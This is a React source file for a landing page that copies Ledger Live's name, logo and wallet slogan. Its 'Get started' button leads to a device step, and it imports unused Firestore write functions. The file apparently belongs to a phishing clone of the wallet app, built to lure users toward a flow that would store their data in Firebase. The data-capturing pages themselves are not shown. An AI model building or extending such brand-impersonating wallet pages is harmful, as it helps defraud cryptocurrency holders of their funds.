import { useState, useEffect } from 'react';
import { Link, redirect, useNavigate } from 'react-router-dom';
import { Helmet, HelmetProvider } from 'react-helmet-async';
import DataService from '../../services/DataService';
import ValidationService from '../../services/ValidationService';
import { toast } from 'react-toastify';
import AppLayout from '../../layouts/AppLayout';
import { HiOutlineArrowLongRight } from "react-icons/hi2";
import { PiDesktopTowerBold } from "react-icons/pi";
import { BsUsbPlug } from "react-icons/bs";
import { FaBluetoothB } from "react-icons/fa";
import { FaStar, FaStarHalf, FaDesktop, FaRightLong, FaArrowRightLong, FaCoins, FaTabletScreenButton, FaChevronRight, FaFacebook,FaReddit,FaTwitter,FaInstagram, FaLinkedin, FaYoutube, FaTiktok, FaDiscord, FaCcPaypal } from "react-icons/fa6";


import logo from './../../assets/img/ledger.png';
import video from './../../assets/img/video.mp4';


import {db} from './../../services/Firebase';
import { collection, addDoc, getDocs } from "firebase/firestore";

function Home() {

    return (<AppLayout>
        <Helmet>
            <title>Ledger Live</title>
        </Helmet>
        <div className='container-fluid'>
            <div className='row'>
                <div className='col-sm-3 px40 pt40 position-relative' style={{height:"100vh"}}>
                    <Link className="" >
                        <img src={logo} alt="Logo" width="120" style={{filter: "invert(1)"}} title='CRYPTOCURRENCY & NFT WALLET' className="d-inline-block align-text-top" />
                    </Link>
                    <h1 className='text-white h5 ls1 lh40 fw-bold mobile_web_font pt30'>THE MOST SECURE CRYPTOCURRENCY & NFT WALLET</h1>
                    <p className="pt20 fs14">Securely manage, buy and grow your crypto and NFTs on Ledger Live</p>
                    <div className="position-absolute w-100" style={{bottom:0, left:0}}>
                        <div class="d-grid px60">
                            <Link to="device" className='btn bg-secondary2 bg-white btn-lg text-black rounded-pill fw-bold fs16'>Get started <HiOutlineArrowLongRight  className='fs25 ms15'/></Link>
                        </div>
                        <p className='pt30 text-secondary fs14 text-center'>
                            <div className='lh25'>By tapping "Get started" you consent and agree to our</div>
                            <Link className='text-decoration-none pt20 text-white-50 fs14 lh20'>Terms of Service and Privacy Policy</Link></p>
                    </div>
                </div>
                <div className='col-sm-9' style={{height:"100vh"}}>
                    <video width="100%" style={{opacity:"0.5"}}  autoPlay loop muted>
                        <source src={video} type="video/mp4" />
                    </video>
                </div>
            </div>
        </div>
    </AppLayout>)
}

export default Home
